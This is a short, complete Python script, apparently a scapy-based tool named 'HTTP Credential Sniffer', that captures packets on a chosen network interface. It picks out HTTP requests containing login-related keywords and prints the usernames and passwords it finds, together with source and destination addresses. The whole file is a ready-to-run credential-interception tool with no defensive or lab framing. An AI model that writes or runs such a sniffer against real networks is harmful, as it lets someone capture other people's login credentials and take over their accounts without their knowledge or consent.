import scapy.all as scapy
from scapy.layers import http
from datetime import datetime


def listen_packets(interface):
    """Sniff packets on the specified interface"""
    scapy.sniff(iface=interface, store=False, prn=analyze_packets)


def analyze_packets(packet):
    """Analyze packets for credentials"""
    if packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw):
        try:
            load = packet[scapy.Raw].load.decode(errors="ignore")
            src_ip = packet[scapy.IP].src
            dst_ip = packet[scapy.IP].dst

            # Check for credentials
            credentials = []
            if any(k in load.lower() for k in ["username", "user", "login", "email"]):
                credentials.append(("USER", parse_credentials(load)))
            if any(k in load.lower() for k in ["password", "pass", "pwd"]):
                credentials.append(("PASS", parse_credentials(load)))

            if credentials:
                print(f"\n[{datetime.now().strftime('%H:%M:%S')}] {src_ip} -> {dst_ip}")
                for cred_type, cred_data in credentials:
                    print(f"{cred_type}: {cred_data}")

        except Exception:
            pass


def parse_credentials(data):
    """Extract key-value pairs from data"""
    try:
        from urllib.parse import parse_qs
        parsed = parse_qs(data)
        return " | ".join(f"{k}={v[0]}" for k, v in parsed.items())
    except:
        return data[:100] + ("..." if len(data) > 100 else "")


if __name__ == "__main__":
    import argparse

    print("HTTP Credential Sniffer - Simple Mode")
    print("Press CTRL+C to exit\n")
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", required=True, help="Network interface (e.g., eth0, wlan0)")
    args = parser.parse_args()
    print(f"Listening on {args.interface}...")
    listen_packets(args.interface)